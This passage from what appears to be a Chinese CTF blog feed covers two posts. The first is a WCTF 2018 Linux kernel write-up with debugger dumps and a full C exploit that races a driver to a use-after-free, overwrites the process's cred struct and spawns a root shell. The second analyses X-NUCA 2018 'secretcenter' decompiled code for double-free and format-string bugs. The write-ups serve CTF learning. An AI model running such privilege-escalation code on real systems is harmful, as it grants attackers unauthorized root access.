ffff880007883fc0</span><br><span class="line">   f 3 ffff880000957dd8</span><br><span class="line">   f 4 ffffffff810a1a0f</span><br><span class="line">   f 5          1b7cb50</span><br><span class="line">   f 6          1200011</span><br><span class="line">   f 7 ffff880007883fc0</span><br><span class="line">   f 8                0</span><br><span class="line">pwndbg&gt; i r rdi</span><br><span class="line">rdi            0xffff880006801800-131941286275072</span><br><span class="line">pwndbg&gt; x /40gx 0xffff880006801800</span><br><span class="line">0xffff880006801800:0x0000000000019ee00x0000000040000000</span><br><span class="line">0xffff880006801810:0x00000000000000050x000000c0000000c0</span><br><span class="line">0xffff880006801820:0x0000001e000000000x0000000000000015</span><br><span class="line">0xffff880006801830:0x00000000000000150x0000000000000015</span><br><span class="line">0xffff880006801840:0x00000004000000000x0000000000000000</span><br><span class="line">0xffff880006801850:0x00000008000000c00x0000000000000000</span><br><span class="line">0xffff880006801860:0xffffffff81ce010b0xffff880006801968</span><br><span class="line">0xffff880006801870:0xffff8800068017680xffff880007845060</span><br><span class="line">0xffff880006801880:0xffff8800068019800xffff880006801780</span><br><span class="line">0xffff880006801890:0xffff880006afbb580xffff880006afbb40</span><br><span class="line">0xffff8800068018a0:0xffffffff81e711c00xffff8800078488e8</span><br><span class="line">0xffff8800068018b0:0x00000007000000020x0000000000000001</span><br><span class="line">0xffff8800068018c0:0xffff8800068018c00xffff8800068018c0</span><br><span class="line">0xffff8800068018d0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff8800068018e0:0x00000000000000000xffff88000783e3c0</span><br><span class="line">0xffff8800068018f0:0x00000000000003e80xffff880006800e40</span><br><span class="line">0xffff880006801900:0x0000000000019ec00x0000000040000000</span><br><span class="line">0xffff880006801910:0x00000000000000050x0000008000000080</span><br><span class="line">0xffff880006801920:0x0000001e000000000x0000000000000020</span><br><span class="line">0xffff880006801930:0x00000000000000200x0000000000000020</span><br><span class="line">pwndbg&gt; x /s 0xffffffff81ce010b</span><br><span class="line">0xffffffff81ce010b:<span class="string">"kmalloc-192"</span></span><br></pre></td></tr></table></figure><p>然而，用劫持ptmx这种方法也不行，因为缺少地址泄露…</p><p>最后一种方法是利用本身的结构，如果我们可以找到一个函数申请到这个堆块，并把size位置的很大，也可以用来越界读写，由于这个堆块也是在映射区里，所以当cred结构体在高地址时，同样是可以覆写的，就类似于zer0fs那题。</p><p>不过，内核太大了，调kmalloc或者kmem_cache_alloc(kmalloc-xx)的太多，真的没办法一个一个试出来…</p><p>场面一度非常尴尬，调试这堆调用kmalloc函数花了我两天的时间…</p><p>卡了好久以后，发现一篇文章《Linux Kernel universal heap spray》，这篇文章竟然说的就是我遇到的这个问题，在竞争条件时如何找一个能精准控制的内容的函数。</p><p>我没有使用文章提出的终极解决方案，我用了第一种不是很完善的方案就是do_msgsnd函数，虽然前48字节不可控，但是结构体的第二个参数是指针，要知道内核的地址都是0xfffffffxxxxx之类的，原因大于我们需求的范围，从而可以爆破高地址的内存，如果存在一个cred的话，就可以提权了。</p><p>遇到最坑的事儿是，内核里启动了两个uid=1000的进程，一个qemu起的给用户交互这个，另外一个是子进程起EXP这个…</p><p>脚本几次都把父进程提权了，子进程提示提权失败… 也是绝望，不过也算是提取成功了吧…</p><p>还有就是memmem这个函数，emmmmm，真是略坑。</p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define _GNU_SOURCE         /* See feature_test_macros(7) */</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/ipc.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/msg.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#define ADD_ITEM    0x1337</span></span><br><span class="line"><span class="comment">#define SELECT_ITEM 0X1338</span></span><br><span class="line"><span class="comment">#define REMOVE_ITEM 0X1339</span></span><br><span class="line"><span class="comment">#define LIST_HEAD   0X133A</span></span><br><span class="line"><span class="comment">#define BUFF_SIZE 96-48</span></span><br><span class="line"><span class="comment">#define MEM_SIZE 0X300000</span></span><br><span class="line">struct add_opt</span><br><span class="line">&#123;</span><br><span class="line">  size_t size;</span><br><span class="line">  char * mem;</span><br><span class="line">&#125;;</span><br><span class="line">void print_hex(char *buf,int size)&#123;</span><br><span class="line">int i;</span><br><span class="line">puts(<span class="string">"======================================"</span>);</span><br><span class="line">printf(<span class="string">"data :\n"</span>);</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;(size/<span class="number">8</span>);i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (i%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">printf(<span class="string">"%d"</span>,i/<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">printf(<span class="string">" %16llx"</span>,*(size_t * )(buf + i*<span class="number">8</span>));</span><br><span class="line"><span class="keyword">if</span> (i%<span class="number">2</span> == <span class="number">1</span>)&#123;</span><br><span class="line">printf(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">puts(<span class="string">"======================================"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int add_item(int fd,size_t size,char * content)&#123;</span><br><span class="line">struct add_opt opt;</span><br><span class="line">opt.size = size;</span><br><span class="line">opt.mem = malloc(size);</span><br><span class="line"><span class="keyword">if</span> (opt.mem == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">memcpy(opt.mem,content,size);</span><br><span class="line">ioctl(fd,ADD_ITEM,&amp;opt);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int list_head(int fd,char *mem)&#123;</span><br><span class="line"><span class="keyword">if</span> (mem!=<span class="number">0</span>)&#123;</span><br><span class="line">ioctl(fd,LIST_HEAD,mem);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int select_item(int fd,size_t idx)&#123;</span><br><span class="line">ioctl(fd,SELECT_ITEM,idx);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int remove_item(int fd,size_t idx)&#123;</span><br><span class="line">ioctl(fd,REMOVE_ITEM,idx);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int myMemmem(char * a, int alen, char * b, int blen)</span><br><span class="line">&#123;</span><br><span class="line">int i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= alen - blen; ++ i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; blen; ++ j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (a[i + j] != b[j])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (j &gt;= blen)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">void set_cred_root(char *cred,int len,int id)&#123;</span><br><span class="line">int i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i+=<span class="number">4</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(*(int *)(cred+i) == id )</span><br><span class="line">*(int *)(cred+i) =<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">static int fd ;</span><br><span class="line">int i,mem_len;</span><br><span class="line">setvbuf(stdout, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">//char a[]=<span class="string">"p4nda"</span>;</span><br><span class="line">char *mem = malloc(<span class="number">0x1000</span>);</span><br><span class="line">char *result = malloc(<span class="number">0x1000</span>);</span><br><span class="line">char *large_mem = NULL;</span><br><span class="line">int found = NULL;</span><br><span class="line">char cred[<span class="number">0x20</span>];</span><br><span class="line">char *final = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">"/dev/klist"</span>,O_RDWR);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">puts(<span class="string">"[-] open file error!"</span>);</span><br><span class="line">exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i&lt;<span class="number">0x1000</span>;i++)&#123;</span><br><span class="line">mem[i] = <span class="string">'a'</span>;</span><br><span class="line">&#125;</span><br><span class="line">add_item(fd,<span class="number">96</span><span class="number">-0x18</span>,mem);</span><br><span class="line"><span class="keyword">if</span>(fork()==<span class="number">0</span>)&#123;</span><br><span class="line">int j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(;j&lt;<span class="number">1000</span>;j++)&#123;</span><br><span class="line">add_item(fd,<span class="number">96</span><span class="number">-0x18</span>,mem);</span><br><span class="line">list_head(fd,result);</span><br><span class="line">//print_hex(result,<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">if</span> (*(int *)result == <span class="number">1</span>)&#123;</span><br><span class="line">printf(<span class="string">"[+] now we trigger a UAF chunk,with [%d] chunk\n"</span>,j);</span><br><span class="line">//puts();</span><br><span class="line">print_hex(result,<span class="number">0xc0</span>);</span><br><span class="line">exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">3000</span>;i++)&#123;</span><br><span class="line">list_head(fd,result);</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">if</span>(fork()==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)&#123;</span><br><span class="line">printf(<span class="string">"%d"</span>,i);</span><br><span class="line">system(<span class="string">"./pwn_msg"</span>);</span><br><span class="line">&#125;</span><br><span class="line">exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">3</span>);</span><br><span class="line">select_item(fd,<span class="number">0</span>);</span><br><span class="line">read(fd,result,<span class="number">0x1000</span>);</span><br><span class="line">print_hex(result,<span class="number">0xc0</span>);</span><br><span class="line"><span class="keyword">if</span>(*(size_t * )result == <span class="number">0x6161616161616161</span>) &#123;</span><br><span class="line">puts(<span class="string">"[-] cannot realloc the chunk "</span>);</span><br><span class="line">exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">puts(<span class="string">"[+] now we can read everywhere"</span>);</span><br><span class="line">//read(fd,result,<span class="number">0x1000</span>);</span><br><span class="line">//print_hex(result,<span class="number">0xc0</span>);</span><br><span class="line"></span><br><span class="line">large_mem = malloc(MEM_SIZE);//mmap(<span class="number">0</span>,MEM_SIZE,PROT_READ|PROT_WRITE,MAP_ANONYMOUS,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (large_mem == <span class="number">0xffffffffffffffff</span> )&#123;</span><br><span class="line">puts(<span class="string">"[-] cannot mmap large memory"</span>);</span><br><span class="line">exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">printf(<span class="string">"[+] mmap addr %p\n"</span>,large_mem);</span><br><span class="line">memset(large_mem,MEM_SIZE,<span class="number">0</span>);</span><br><span class="line">print_hex(large_mem,<span class="number">0x100</span>);</span><br><span class="line">mem_len = read(fd,large_mem,MEM_SIZE);</span><br><span class="line">printf(<span class="string">"[+] read %d byte\n"</span>, mem_len );</span><br><span class="line">print_hex(large_mem,<span class="number">0x100</span>);</span><br><span class="line">//memcpy(cred,)</span><br><span class="line">*(size_t *)cred = <span class="number">0x000003e800000003</span>;</span><br><span class="line">*(size_t *)(cred+<span class="number">8</span>) = <span class="number">0x000003e8000003e8</span>;</span><br><span class="line">*(size_t *)(cred+<span class="number">0x10</span>) = <span class="number">0x000003e8000003e8</span>;</span><br><span class="line">*(size_t *)(cred+<span class="number">0x18</span>) = <span class="number">0x000003e8000003e8</span>;</span><br><span class="line">found = myMemmem(large_mem,MEM_SIZE,cred,<span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">if</span> (found==<span class="number">-1</span>)&#123;</span><br><span class="line">puts(<span class="string">"[-]cannot find cred struct !"</span>);</span><br><span class="line">exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">printf(<span class="string">"[+] start %p\n"</span>,large_mem);</span><br><span class="line">final = found+large_mem;</span><br><span class="line">printf(<span class="string">"[+] found %p\n"</span>,final);</span><br><span class="line">print_hex(final<span class="number">-0x8</span>,<span class="number">0xb0</span>);</span><br><span class="line">set_cred_root(final<span class="number">-0x8</span>,<span class="number">0x40</span>,<span class="number">1000</span>);</span><br><span class="line">print_hex(final<span class="number">-0x8</span>,<span class="number">0xb0</span>);</span><br><span class="line">getchar();</span><br><span class="line">write(fd,large_mem,found+<span class="number">0xb0</span>);</span><br><span class="line">//system(<span class="string">"/bin/sh"</span>);</span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">printf(<span class="string">"[+]now you are r00t,enjoy ur shell\n"</span>);</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">puts(<span class="string">"[-] there must be something error ... "</span>);</span><br><span class="line">exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/2814" target="_blank" rel="noopener">https://xz.aliyun.com/t/2814</a></p><p><a href="https://cyseclabs.com/blog/linux-kernel-heap-spray" target="_blank" rel="noopener">https://cyseclabs.com/blog/linux-kernel-heap-spray</a></p><p><a href="https://blog.csdn.net/vanbreaker/article/details/7694648" target="_blank" rel="noopener">https://blog.csdn.net/vanbreaker/article/details/7694648</a></p><p><a href="https://blog.csdn.net/vanbreaker/article/details/7695264" target="_blank" rel="noopener">https://blog.csdn.net/vanbreaker/article/details/7695264</a></p><p><a href="https://blog.csdn.net/lukuen/article/details/6935068" target="_blank" rel="noopener">https://blog.csdn.net/lukuen/article/details/6935068</a></p>]]></content>
    
    <summary type="html">
    
      题目来源于WCTF 2018，shellphish出的一道比较简单的内核题目，苦于比赛时并不会内核，到今天才重新拿出来复现。
    
    </summary>
    
    
      <category term="KERNEL" scheme="http://p4nda.top/tags/KERNEL/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="Linux" scheme="http://p4nda.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>X-NUCA&#39;2018 secretcenter 解题思路</title>
    <link href="http://p4nda.top/2018/11/26/XNUCA-secretcenter/"/>
    <id>http://p4nda.top/2018/11/26/XNUCA-secretcenter/</id>
    <published>2018-11-26T02:54:00.000Z</published>
    <updated>2018-12-04T05:01:42.215Z</updated>
    
    <content type="html"><![CDATA[<p>此题是X-NUCA’2018的一道题目，在比赛过程中没有队伍解出。赛后在得到AFang师傅的提示后复现成功，感谢AFang师傅。题目及附件<a href="https://github.com/ret2p4nda/libc-pwn/tree/master/secretcenter" target="_blank" rel="noopener">下载</a></p><p>本文的先知社区链接：<a href="https://xz.aliyun.com/t/3431" target="_blank" rel="noopener">https://xz.aliyun.com/t/3431</a></p><h1 id="题目及漏洞分析"><a href="#题目及漏洞分析" class="headerlink" title="题目及漏洞分析"></a>题目及漏洞分析</h1><p>题目中初始化过程中首先从’secret.txt’中读入一个字符串，存放在申请的堆中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_secret</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  bss_malloc_secret = <span class="built_in">malloc</span>(<span class="number">0x78</span>uLL);</span><br><span class="line">  v0 = open(<span class="string">"secret.txt"</span>, <span class="number">0x80000</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v0 == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read(v0, bss_malloc_secret, <span class="number">0x78</span>uLL) == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> close(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用户可以输入size申请不大于0x18f大小堆块，并向堆块中输入内容，内容首先输入在栈上，然后通过memcpy复制到堆上，此时栈上是有用户输入的。然后逐字节与secret.txt读入的内容比较，判断是否相等。当相同字节数等于strlen(secret)时，会调用一个函数，这个函数会通过读取/proc/self/maps文件，给出程序的内存空间分布，最终将用户的输入输出到stderr文件，此处用了_fprintf_chk函数，是fprintf的安全版本，存在一个格式化字符串漏洞，但是由于是向stderr输出，并不会返回给用户，无法泄露地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">input</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ebp</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// kr08_8</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+Ch] [rbp-22Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+218h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Secret Size: "</span>);</span><br><span class="line">  LODWORD(size) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;size);</span><br><span class="line">  v0 = size;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(size - <span class="number">0x65</span>) &gt; <span class="number">0x12A</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  bss_malloc_user = <span class="built_in">malloc</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  bss_size = v0;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Content: \n"</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  syscall(<span class="number">0L</span>L, <span class="number">0L</span>L, (<span class="keyword">char</span> *)&amp;size + <span class="number">4</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  <span class="built_in">memcpy</span>(bss_malloc_user, (<span class="keyword">char</span> *)&amp;size + <span class="number">4</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)bss_malloc_secret) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v1 - <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)bss_malloc_secret + i) != *((_BYTE *)bss_malloc_user + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Not Good Secret :P\n"</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)bss_malloc_secret) )</span><br><span class="line">    give_vmmap();</span><br><span class="line">  _fprintf_chk((__int64)<span class="built_in">stderr</span>, <span class="number">1L</span>L, (__int64)&amp;size + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在释放函数中，程序可以对input函数中申请的堆块释放，但没有把指针清空，存在悬垂指针，导致double free。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">free</span>(bss_malloc_user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且可以通过edit函数，对之前的堆块进行修改，由于悬垂指针的问题，存在UAF。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">edit_secret</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"size: \n"</span>, <span class="number">7u</span>LL);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v1 &lt;= <span class="number">0</span> || v1 &gt;= bss_size )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Content: \n"</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> syscall(<span class="number">0L</span>L, <span class="number">0L</span>L, bss_malloc_user, v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外，用户可以通过guard_ready函数，首先通过malloc申请一个0xf0的堆块，并且对这个堆块初始化一些数据，这个数据是一段预置的seccomp规则，后续再说。</p><p>在set_guard函数中，通过prctl函数将之前预置的seccomp规则生效。此处存在一个问题，由于程序可以任意设置大小的堆块，而设置seccomp规则的函数与ptctl不在一个函数中，因此可以通过UAF来修改这个seccomp规则。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 